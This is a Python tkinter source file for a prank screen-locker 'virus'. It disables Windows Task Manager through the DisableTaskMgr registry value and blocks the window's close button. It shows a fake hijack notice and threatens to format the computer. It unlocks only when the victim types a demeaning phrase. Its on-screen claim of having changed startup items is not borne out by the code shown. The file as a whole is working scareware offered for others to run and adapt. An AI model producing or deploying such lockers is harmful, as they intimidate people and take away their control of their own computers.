import time
from tkinter import *
from tkinter import messagebox
from tkinter import scrolledtext
from tkinter.ttk import Progressbar
from ttkbootstrap import Style
import tkinter.messagebox
import  tkinter
from tkinter import ttk
import winreg
import tkinter as tk

def tui():
    tkinter.messagebox.showwarning(title='警告', message='关不上啦，乖乖的输入"你是我爸爸"，该程序会自动解锁')

def tui2():
    tkinter.messagebox.showwarning(title='警告', message='屡教不改是吧，再给你次机会，下次把你电脑格式化了！！！')
def close():
    key_path = r'Software\Microsoft\Windows\CurrentVersion\Policies\System'

    # 创建注册表项
    key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)

    # 设置禁用任务管理器的值
    value_name = 'DisableTaskMgr'
    value_data = 1
    value_type = winreg.REG_DWORD
    winreg.SetValueEx(key, value_name, 0, value_type, value_data)

    # 关闭注册表项
    winreg.CloseKey(key)
def open():


    # 获取任务管理器注册表项的路径
    key_path = r'Software\Microsoft\Windows\CurrentVersion\Policies\System'

    # 打开注册表项
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)

    # 删除禁用任务管理器的值
    value_name = 'DisableTaskMgr'
    winreg.DeleteValue(key, value_name)

    # 关闭注册表项
    winreg.CloseKey(key)

close()
# 创建主窗口
root = Tk()

# 创建样式对象
style = Style()
root.protocol("WM_DELETE_WINDOW", tui)
# 设置样式
style.theme_use('flatly')
style.configure('TFrame', background='#ff3333')
style.configure('TButton', background='#ffffff', foreground='#ff3333', bordercolor='#ffffff')
style.configure('TLabel', background='#ff3333', foreground='#ffffff')
style.configure('TProgressbar', background='#880000', troughcolor='#ff3333', bordercolor='#ff3333')

# 创建 Frame
frame = ttk.Frame(root)

# 将 Frame 放置在窗口左侧
frame.pack(side=LEFT, fill=Y)

# 创建按钮1
def btn1_click():
    # open()
    messagebox.showinfo('提示', '你点击了解锁按钮,叫我爸爸吧~')
    messagebox.showinfo('提示', '那么，输入吧~')

    def ok():
        window = tk.Tk()

        # 设置窗口标题
        window.title("www")

        # 设置窗口大小
        window.geometry("300x200")

        # 创建标签和输入框
        label = tk.Label(window, text="请输入文本：")
        label.pack()

        input_box = tk.Entry(window)
        input_box.pack()

        # 定义提交按钮的回调函数
        def submit():
            # 获取用户输入的内容
            input_text = input_box.get()

            # 判断输入内容是否为空
            if input_text == "":
                result_label.config(text="输入内容不能为空！")
            else:
                result_label.config(text="输入的内容为：" + input_text)
                if input_text=='你是我爸爸':
                    window = tk.Tk()

                    # 设置窗口标题
                    window.title("666")

                    # 设置窗口大小
                    window.geometry("1000x500")

                    # 创建文本框
                    text_box = tk.Text(window)
                    text_box.pack()


                    # 创建按钮
                    text_box.insert(tk.END,
                                    "好啦，这个程序的目的单纯只是为了娱乐，你也不用为此放在心上，另外，此代码意见开源，可以在github上下载,可以学习试用，不要真的用于做病毒哦，当你点击关闭时，程序将自动关闭，不会对电脑产生任何危害，同时也会取消对任务管理器的限制!\n\n\n\n链接：https://github.com/gjjwh/meaningless-virus\n")

                    button = tk.Button(window, text="关闭程序",
                                       command=jb)
                    button.pack()

                    # 运行窗口
                    window.mainloop()

                else:
                    messagebox.showinfo('提示', '你没有叫我爸爸，呵呵~重新来！')
                    ok()



        # 创建提交按钮
        submit_button = tk.Button(window, text="提交", command=submit)
        submit_button.pack()

        # 创建结果标签
        result_label = tk.Label(window, text="")
        result_label.pack()

        # 运行窗口
        window.mainloop()

    ok()


def jb():
    open()
    time.sleep(1)
    exit()



btn1 = ttk.Button(frame, text='解锁', command=btn1_click)
btn1.pack(padx=10, pady=10)

# 创建按钮2
def btn2_click():
    messagebox.showinfo('提示', '项目链接：https://github.com/gjjwh/meaningless-virus,\n—————————————————————————\n制作者：搞机居委会\n\n时间：2023.4.30\n\n版本：0.01fun')

btn2 = ttk.Button(frame, text='关于', command=btn2_click)
btn2.pack(padx=10, pady=10)

# 创建标签
label = ttk.Label(root, text='您的电脑已被Pyp病毒劫持，请使用解锁按钮解锁', font=('Arial', 20))

# 将标签放置在窗口右侧
label.pack(side=RIGHT, padx=20, pady=20)

# 创建滚动文本框
text_box = scrolledtext.ScrolledText(root, width=50, height=20, wrap=WORD,foreground="red")
text_box.tag_config("red", foreground="red")
text_box.pack(fill="both", expand=True)
text_box.insert("end","一,您的电脑已经被我们病毒锁定,你该怎么办\n\n这个病毒是一个娱乐类型病毒，不会对你的电脑造成任何伤害，只需要点击解锁按钮即可\n\n————————————————————————\n二,这个真的不会对电脑造成任何影响嘛\n\n是的是的，不会的，你可以下载源代码并改造自己的版本，目前只是修改了你的注册表让你无法使用任务管理器关闭该程序，并且修改了启动项而已，你的电脑配置和文件夹目录等详细在根目录内。你可以自己下载源码添加其他的功能","red")
text_box.pack(padx=20, pady=20)

# 创建进度条
progress = Progressbar(root, orient=HORIZONTAL, length=200, mode='determinate')
progress.pack(side=BOTTOM, padx=20, pady=20)

# 更新进度条
def update_progress():
    progress['value'] += 1
    if progress['value'] >= 100:
        progress['value'] = 0
    root.after(50, update_progress)

# 启动进度条更新
update_progress()

# 启动主循环
root.mainloop()
